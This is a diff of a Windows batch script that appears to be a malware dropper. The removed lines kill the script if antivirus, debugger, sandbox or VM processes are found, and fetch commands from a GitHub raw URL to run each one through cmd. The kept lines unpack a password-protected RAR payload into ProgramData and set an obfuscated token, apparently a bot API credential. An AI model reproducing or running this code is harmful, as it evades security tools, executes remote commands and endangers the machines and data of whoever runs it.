@@ -1,24 +1,4 @@
-setlocal EnableDelayedExpansion
-
-if exist "%ProgramData%\AUX..\Input.exe" (
-    rd /s /q "%ProgramData%\dist"
-    del /f "%~f0"
-    exit /b
-)
-
-set "processList=ekrn.exe egui.exe spideragent.exe AvastUI.exe avgui.exe avp.exe avpui.exe UninstallTool.exe UninstallToolHelper.exe SandboxieRpcSs.exe SandboxieDcomLaunch.exe httpdebuggerui.exe wireshark.exe fiddler.exe vboxservice.exe df5serv.exe vboxtray.exe vmtoolsd.exe vmwaretray.exe ida64.exe ollydbg.exe pestudio.exe vmwareuser.exe vgauthservice.exe vmacthlp.exe vmsrvc.exe x32dbg.exe x64dbg.exe x96dbg.exe vmusrvc.exe prl_cc.exe prl_tools.exe qemu-ga.exe joeboxcontrol.exe ksdumperclient.exe xenservice.exe joeboxserver.exe devenv.exe immunitydebugger.exe windbg.exe 32dbg.exe 64dbg.exe protection_id.exe scylla_x86.exe scylla_x64.exe scylla.exe idau64.exe idaq64.exe"
-
-for %%a in (%processList%) do (
-    tasklist /FI "IMAGENAME eq %%a" 2>NUL | find /I "%%a" >NUL
-    if not errorlevel 1 (
-        rd /s /q "%ProgramData%\dist"
-        del /f "%~f0"
-        exit /b
-    )
-)
-
 "%ProgramData%\dist\UnRAR.exe" x -y -p%JVPCOT%1%RPJJKX%4%OJ ERZ%7%EUCUJK%8%ATXODM%5%DSJIDL%2%HTHDOT%3%AVVUYS%6%NZDNDG%9 "%ProgramData%\dist\51654.rar" "%ProgramData%\dist\"
-powershell.exe -C "$c = (iwr 'https://raw.githubusercontent.com/githa0/0/0/0/confrus' -UseBasicParsing).Content; foreach ($line in $c -split \"`n\") { cmd /c $line }"
 
 setlocal EnableDelayedExpansion
 set "TOKEN=%RAE XE%7%RDAYKM%6%NJSEZY%1%SLVIQX%5%UEH WJ%3%NSHPSF%5%FTSLVK%3% HHJEF%8%KHUEVS%7%MILHFS%6:%XRISLT%A%EZSN G%A%FHRLJJ%F-%QLACQO%M%PIXQDJ%c%UZNAOE%j%BHWOEG%1%NYHO O%D%AA CRV%D%RVBUCD%x%XOVITB%s%UFTNJB%8%NBGVPS%5%HAJIPD%m-%KSHTKU%p%CIFTSQ%U%LFFGVU%4%VOSYPP%f%OXFJNB%A%VOZSZA%I%VBWZKB%R%XVKRJK%3%NAGPOB%4%LMCSEN%j%PUVDZE%J%RUGEMU%1%ZXEQBV%r%FYOWWM%8%WFAYGM%y%YCXIKR%7%HUXF P%p%EJPNQR%5%YWLIMH%4"
